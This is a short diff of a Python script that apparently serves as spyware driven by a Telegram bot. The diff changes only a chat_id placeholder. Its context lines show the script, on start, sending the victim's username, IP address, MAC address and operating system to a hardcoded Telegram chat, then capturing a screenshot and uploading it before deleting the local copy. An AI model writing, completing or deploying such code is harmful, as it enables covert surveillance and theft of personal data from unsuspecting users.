@@ -34,7 +34,7 @@ async def start(*args):
     await bot.send_message(text=f'!!!ПРОГРАММА ЗАПУЩЕНА!!! \nИмя пользователя: {name} \nIp-адресс: {ip} \nMAC-адресс: {mac} \nСистема: {ost}', chat_id='892341815')
     pyautogui.screenshot("screenshot.jpg")
     with open('screenshot.jpg', 'rb') as photo:
-        await bot.send_document(chat_id='ur chat id with ur bot', document=photo)
+        await bot.send_document(chat_id='', document=photo)
     os.remove('screenshot.jpg')
 
 
